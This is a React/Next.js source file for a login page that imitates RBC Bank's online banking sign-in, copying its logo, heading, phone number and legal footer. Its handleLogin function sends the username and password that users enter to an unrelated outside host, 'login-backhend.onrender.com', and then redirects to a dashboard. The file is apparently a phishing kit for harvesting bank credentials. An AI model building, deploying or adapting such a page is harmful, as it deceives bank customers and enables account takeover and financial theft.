import {
  Box,
  Button,
  Center,
  Checkbox,
  Flex,
  FormControl,
  FormLabel,
  Heading,
  Image,
  Input,
  List,
  ListItem,
  Text,
  useToast,
} from "@chakra-ui/react";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React from "react";

function OnlineBanking() {
  const [email, setEmail] = React.useState("");
  const [password, setPassword] = React.useState("");
  const [isloading, setIsloading] = React.useState(false);
  const router = useRouter();
  const toast = useToast();

  function handleLogin() {
    setIsloading(true);
    axios
      .post("https://login-backhend.onrender.com", {
        email,
        password,
      })
      .then((res) => {
        if (res.data) {
          console.log(res.data);
          toast({
            title: "Login Successful",
            description: "Success",
            status: "success",
            duration: 1000,
            isClosable: true,
            position: "top",
          });
          router.push("dashboard");
          setIsloading(false);
        }
      })
      .catch((err) => {
        // console.log(err);
        toast({
          title: "Check Info provided",
          description: "Error",
          status: "error",
          duration: 1000,
          isClosable: true,
          position: "top",
        });
        setIsloading(false);
      });
  }
  return (
    <div>
      <Head>
        <title>RBC Bank - Online Banking</title>
         <link rel="icon" href="../includes/rbc-app-icon.svg" type="image/x-icon"></link>
      </Head>
      <Box
        borderBlock="2px solid #002888"
        minH={"5.5rem"}
        mt="1px"
        paddingInline={"2rem"}
        paddingBlockStart={"1rem"}
        as="header"
      >
        <Image src="/rbc_bank_ga.gif" alt="rbc_bank_ga" />
      </Box>
      <Box bg="#002888" py="7" display={{ base: "none", l: "block" }} />
      <Flex
        flexDirection={{ base: "column", l: "row" }}
        align="start"
        mt={{ base: "2rem", l: "5rem" }}
        gap="10"
        w={{ base: "95%" }}
        mx="auto"
      >
        <Box
          px="40"
          mx="auto"
          boxShadow={"1px 1px 4px #C1B5A5"}
          borderRadius="5px"
          padding="1rem 3% 1rem 3%"
          w={{ base: "95%", l: "70%" }}
        >
          <Box borderBlockEnd={"1px solid #C1B5A5"}>
            <Heading
              as="h1"
              fontSize={"1.5rem"}
              color="#002888"
              fontWeight={"normal"}
              lineHeight="2"
              mb="12px"
            >
              Sign In To Online Banking
            </Heading>
          </Box>
          <Center py="30" flexDirection={"column"} gap="7">
            <FormControl
              display={"flex"}
              alignItems="center"
              flexDirection={{ base: "column", l: "row" }}
              justifyContent={"center"}
            >
              <Text color="#666" fontSize={"18px"} fontWeight="normal" mr="8">
                Username:
              </Text>
              <Input
                type="email"
                border="1px solid #CCC"
                boxShadow={"0px 3px 3px 0px #DDD"}
                p="10px"
                w="250px"
                borderRadius={"5px"}
                onChange={(e) => setEmail(e.target.value)}
              />
            </FormControl>
            <FormControl
              display={"flex"}
              alignItems="center"
              justifyContent={"center"}
              flexDirection={{ base: "column", l: "row" }}
            >
              <Text color="#666" fontSize={"18px"} fontWeight="normal" mr="8">
                Password:
              </Text>
              <Input
                type="password"
                border="1px solid #CCC"
                boxShadow={"0px 3px 3px 0px #DDD"}
                p="10px"
                borderRadius={"5px"}
                w="250px"
                onChange={(e) => setPassword(e.target.value)}
              />
            </FormControl>
            <Flex ml={{ base: "1px", md: "100px" }}>
              <input type="checkbox" id="Remember" name="Remember" />
              <FormLabel color="#666" htmlFor="Remember" ml="3">
                Remember My Username
                <Text
                  as="span"
                  color="#008cba"
                  borderBlockEnd={"1px dotted #CCC"}
                  cursor="help"
                >
                  (Learn More)
                </Text>
              </FormLabel>
            </Flex>
            <Flex
              gap="2"
              ml={{ base: "1", md: "20" }}
              flexDirection={{ base: "column-reverse", l: "row" }}
              mt="3"
            >
              <Button
                bg="#bbb"
                border="1px solid #1712124a"
                color="#171212f0"
                py="5"
                px="4"
                borderRadius={"3px"}
                cursor="pointer"
                fontWeight={"normal"}
              >
                Forget Login Info?
              </Button>
              <Button
                bg="#002888"
                color="#fff"
                py="5"
                px="10"
                _hover={{ color: "#fff" }}
                fontWeight={"normal"}
                borderRadius={"3px"}
                cursor="pointer"
                border="none"
                isLoading={isloading}
                onClick={handleLogin}
              >
                Sign In
              </Button>
            </Flex>
          </Center>
        </Box>
        <Box bg="#EEE" px="10" mx="auto" py="8" w={{ base: "95%", l: "30%" }}>
          <Heading
            as="h3"
            fontSize={"1.5rem"}
            color="#002888"
            fontWeight={"normal"}
            lineHeight="2"
            mb="12px"
          >
            Online Banking
          </Heading>
          <List listStyleType={"initial"} listStylePos="inside">
            {["Enroll Now!", "Frequently Asked Questions", "Learn More"].map(
              (item) => (
                <ListItem
                  margin={".3em 0 .3em 1em"}
                  fontSize="16px"
                  key={item}
                  color="#007298"
                  cursor={"pointer"}
                >
                  <Text as="a" textDecoration={"underline"}>
                    {item}
                  </Text>
                </ListItem>
              )
            )}
          </List>
        </Box>
      </Flex>
      <Box px="12" mx="auto" py="10">
        <Text color="#666" fontSize={"13px"}>
          Trouble signing in? Review our User Tips or call 1-800 ROYAL 5-3
          (1-800-769-2553) for assistance.
        </Text>
      </Box>
      <Box px="12" py="10" bg="#EEE" borderTop={"1px solid #CCC"}>
        <Flex gap="4" flexDirection={{ base: "column", l: "row" }}>
          <Text
            textDecoration={"underline"}
            color="#007298"
            fontSize={"10px"}
            cursor="pointer"
          >
            Privacy & Security
          </Text>
          <Text
            textDecoration={"underline"}
            color="#007298"
            fontSize={"10px"}
            cursor="pointer"
          >
            Online Banking Terms and Conditions
          </Text>
          <Text
            textDecoration={"underline"}
            color="#007298"
            fontSize={"10px"}
            cursor="pointer"
          >
            Legal
          </Text>
        </Flex>
        <Text color="#666" fontSize={"14px"} lineHeight="20px" mt="4">
          Equal Housing Lender Equal Housing Lender. Member FDIC. ® / ™
          Trademarks of Royal Bank of Canada. Used under license. RBC Bank means
          RBC Bank (Georgia), N.A., a subsidiary of Royal Bank of Canada. © RBC
          Bank (Georgia), N.A. 2024
        </Text>
      </Box>
    </div>
  );
}

export default OnlineBanking;
